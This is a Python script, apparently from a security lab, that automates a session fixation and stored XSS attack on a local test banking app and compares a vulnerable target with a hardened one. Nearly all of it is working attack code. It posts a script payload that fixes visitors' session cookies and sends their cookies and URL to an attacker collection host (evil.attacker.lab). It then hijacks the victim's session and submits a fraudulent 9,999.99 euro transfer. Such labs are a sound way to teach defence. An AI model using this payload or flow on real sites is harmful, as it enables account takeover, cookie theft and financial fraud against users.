#!/usr/bin/env python3
"""P03 — Session Fixation + XSS : automatisation de l'attaque contre app-vulnerable."""

import argparse
import sys
import time

import requests

ATTACKER_SID = "ATTACKERfixedSID001"


class Color:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    B = "\033[94m"; C = "\033[96m"; X = "\033[0m"; W = "\033[97m"
    BOLD = "\033[1m"


def title(text):  print(f"\n{Color.BOLD}{Color.C}━━━ {text} ━━━{Color.X}")
def step(n, text): print(f"{Color.Y}[{n}]{Color.X} {text}")
def ok(text):     print(f"  {Color.G}✓{Color.X} {text}")
def fail(text):   print(f"  {Color.R}✗{Color.X} {text}")
def info(text):   print(f"  {Color.B}→{Color.X} {text}")


def run_attack(base: str, host_header: str, expect_success: bool) -> bool:
    title(f"Scénario contre {host_header} ({base})")
    headers = {"Host": host_header, "User-Agent": "P03-AttackBot/1.0"}

    step(1, "Mallory fixe le SID via paramètre URL")
    mallory_cookies = {"PHPSESSID": ATTACKER_SID}
    r = requests.get(f"{base}/login.php", headers=headers, cookies=mallory_cookies, allow_redirects=False)
    info(f"GET /login.php (PHPSESSID={ATTACKER_SID}) -> {r.status_code}")

    step(2, "Mallory s'authentifie pour activer le SID côté serveur")
    r = requests.post(f"{base}/login.php", headers=headers, cookies=mallory_cookies,
                      data={"username": "mallory", "password": "EvilPass1!"}, allow_redirects=False)
    info(f"POST /login.php (mallory) -> {r.status_code}")
    if r.status_code in (302, 303):
        ok("Mallory connecté — SID valide côté serveur")

    step(3, "Mallory poste un commentaire XSS qui fixe le cookie de tout visiteur")
    payload = (
        '<script>'
        f'document.cookie="PHPSESSID={ATTACKER_SID}; path=/";'
        'new Image().src="http://evil.attacker.lab/collect.php?m=stored-xss"'
        f'+"&sid={ATTACKER_SID}"'
        '+"&c="+encodeURIComponent(document.cookie)'
        '+"&url="+encodeURIComponent(location.href);'
        '</script>'
    )
    r = requests.post(f"{base}/comments.php", headers=headers, cookies=mallory_cookies,
                      data={"content": payload}, allow_redirects=False)
    info(f"POST /comments.php (XSS payload) -> {r.status_code}")
    ok("Payload posté. Tout visiteur de /comments.php sera fixé.")

    requests.get(f"{base}/logout.php", headers=headers, cookies=mallory_cookies)

    step(4, "Alice ouvre le lien piégé (phishing URL)")
    alice_cookies = {"PHPSESSID": ATTACKER_SID}
    r = requests.get(f"{base}/login.php?PHPSESSID={ATTACKER_SID}", headers=headers,
                     cookies=alice_cookies, allow_redirects=False)
    info(f"GET /login.php?PHPSESSID=… -> {r.status_code}")
    ok("Alice a maintenant le cookie de l'attaquant")

    step(5, "Alice s'authentifie")
    r = requests.post(f"{base}/login.php", headers=headers, cookies=alice_cookies,
                      data={"username": "alice", "password": "Password123!"}, allow_redirects=False)
    info(f"POST /login.php (alice) -> {r.status_code}")
    sc = r.headers.get("Set-Cookie", "")
    if "PHPSESSID" in sc and ATTACKER_SID not in sc:
        info("⚠ SID régénéré — attaque bloquée.")
    else:
        ok("Aucune régénération de SID — fixation exploitable")

    step(6, "Mallory rejoue avec le SID fixé")
    r = requests.get(f"{base}/dashboard.php", headers=headers, cookies={"PHPSESSID": ATTACKER_SID},
                     allow_redirects=False)
    info(f"GET /dashboard.php -> {r.status_code}")
    hijacked = False
    if r.status_code == 200 and "Alice" in r.text:
        ok(f"{Color.BOLD}HIJACK CONFIRMÉ{Color.X} : Mallory voit le tableau de bord d'Alice")
        hijacked = True
    elif r.status_code in (302, 303):
        fail("Redirigé — session invalidée, attaque échouée")
    else:
        info("Pas de hijack confirmé")

    if hijacked:
        step(7, "Virement frauduleux depuis le compte d'Alice")
        r = requests.post(f"{base}/transfer.php", headers=headers,
                          cookies={"PHPSESSID": ATTACKER_SID},
                          data={"to_iban": "FR7630001007940000000000042",
                                "amount": "9999.99",
                                "note": "Pwned via session fixation"},
                          allow_redirects=False)
        info(f"POST /transfer.php -> {r.status_code}")
        if r.status_code == 200:
            ok(f"{Color.BOLD}{Color.R}9 999,99 € exfiltrés vers Mallory{Color.X}")

    return hijacked == expect_success or (expect_success and hijacked)


def main() -> int:
    parser = argparse.ArgumentParser(description="P03 - Attaque automatisée Session Fixation + XSS")
    parser.add_argument("--base", default="http://localhost:8080")
    parser.add_argument("--target", choices=["vuln", "secure", "both"], default="both")
    args = parser.parse_args()

    title("P03 — Attaque automatisée : Session Fixation + XSS")
    info(f"Reverse proxy : {args.base}")
    info(f"SID attaquant : {ATTACKER_SID}")

    results = []
    if args.target in ("vuln", "both"):
        results.append(("vuln", run_attack(args.base, "vuln.bank.local", expect_success=True), True))
        time.sleep(0.5)
    if args.target in ("secure", "both"):
        results.append(("secure", run_attack(args.base, "secure.bank.local", expect_success=False), False))

    title("Résumé")
    for tgt, hijacked, expected in results:
        ok_flag = f"{Color.G}OK{Color.X}" if (hijacked == expected) else f"{Color.R}KO{Color.X}"
        outcome = "compromis" if hijacked else "résiste"
        print(f"  [{ok_flag}] {tgt.upper():7s} → {outcome} (attendu : {'compromis' if expected else 'résiste'})")

    print(f"\n{Color.C}Dashboard :{Color.X} http://evil.attacker.lab:8080")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nInterrompu.")
        sys.exit(130)
